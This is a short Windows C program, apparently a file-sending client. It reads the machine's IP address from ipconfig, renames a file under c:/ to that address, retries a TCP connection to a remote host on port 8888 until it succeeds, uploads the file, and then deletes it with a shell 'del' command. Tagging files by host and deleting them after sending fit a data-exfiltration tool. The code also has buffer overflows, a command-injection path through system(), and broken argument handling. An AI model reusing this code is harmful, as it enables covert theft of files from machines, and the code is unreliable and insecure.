#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>




#define  MAX_DATA_BLOCK_SIZE 8192
void error_exit(const char * msg,int val);
void send_file(const char * file_name,const char * ip,u_short port);

//gcc re.c -o re -lwsock32 -lwininet

void trim(char *s);
char * get_ip();

char  destination[1000];

int main(int argc,char** argv){
	
	
	
	
	char *str;
	str= get_ip();
	 
	
	
	char str1[101] = { 0 };
    strcpy(str1, "c:/");
    strcat(str1, str);
    puts(str1);
	
	

    char str2[50] = { 0 };
    strcpy(str2, "c:/");
    strcat(str2, argv[1]);
    puts(str2);
	rename(str2, str1);   
	
	
    u_short port;
    if(argc==3){
        send_file(str1,argv[2],8888);
    }
    else if(argc==4){
        port=(u_short) atoi(argv[1]);
        if(port==0){
            error_exit("ill server",-1);
        }else{
            send_file(str1,argv[1],port);
        }
    }
    else{
        error_exit("par error",-1);
    }
    return 0;
}
void error_exit(const char* msg, int val){
    if(msg){
        printf("%s\n\n",msg);
        }
    printf("usage: ft_client<file name><ip>[port]\n");
    printf("port ,default 8888\n\n");
    exit(val);
}
void send_file(const char* file_name,const char* ip, u_short port){

    WSADATA wsaData;
    SOCKET s;
    FILE *fp;
    struct sockaddr_in server_addr;
    char data[MAX_DATA_BLOCK_SIZE];
    int i;
    int ret;
    fp=fopen(file_name,"rb");
    if(fp==NULL){
        printf("can't open file \n");
        return;
        }
    WSAStartup(0x202,&wsaData);
    s=socket(AF_INET,SOCK_STREAM,0);
    memset((void *)&server_addr,0,sizeof(server_addr));
    server_addr.sin_family=AF_INET;
    server_addr.sin_addr.s_addr=inet_addr(ip);
    server_addr.sin_port=htons(port);
	
		
	
	start:
    while(connect(s,(struct sockaddr *)&server_addr,sizeof(struct sockaddr_in))==SOCKET_ERROR){
        printf("connect fail\n");
    
        Sleep(600);
        goto start;
        }
		
		
		
    printf("send file name ...\n");
    send(s,file_name,strlen(file_name),0);
    send(s,"\0",1,0);
    printf("send contxt ..");
    for(;;){
        memset((void *)data,0,sizeof(data));
        i=fread(data,1,sizeof(data),fp);
        if(i==0){
            printf("\nsend success\n");
            break;
            }
        ret=send(s,data,i,0);
        putchar('.');
        if(ret==SOCKET_ERROR){
            printf("\n send fail\n");
            break;
            }
        }
    fclose(fp);

    closesocket(s);
    WSACleanup();
	
	
		char str3[101] = { 0 };
    strcpy(str3, "del  \"");
    strcat(str3, file_name);
	
	strcat(str3, "\"");
    puts(str3);
	system(str3);
   //printf(file_name);

}



void trim(char *s){
int i,L;
L=strlen(s);
for (i=L-1;i>=0;i--) if (s[i]==' ')strcpy(s+i,s+i+1);
}


char * get_ip(){
	char   psBuffer[128];
   FILE   *pPipe;

   if( (pPipe = _popen( "ipconfig", "rt" )) == NULL )
      exit( 1 );

   while(fgets(psBuffer, 128, pPipe))
   {

  char * pch;
  pch = strstr (psBuffer,"IPv4");
  if (pch != NULL)
  {
   
    char *token = strtok(psBuffer, ":");
    
    while (token != NULL)

    {
		char * pch1;
  pch1 = strstr (token,"IPv4");
  if (pch1 == NULL)
  {
	  

  strcpy(destination, token);

  }
        token = strtok(NULL, "-");
		
    }

  }
 
      //
   }
   

    trim(destination);
	
   /* Close pipe and print return value of pPipe. */
   if (feof( pPipe))
   {
      _pclose( pPipe );
   }
   else
   {
     printf( "Error: Failed to read the pipe to the end.\n");
   }
   
   
   	 
	 
	
 char *tmp = NULL;
if ((tmp = strstr(destination, "\n")))
{
     *tmp = '\0';
}
strcat(destination, ".txt");
	return destination;
	
}
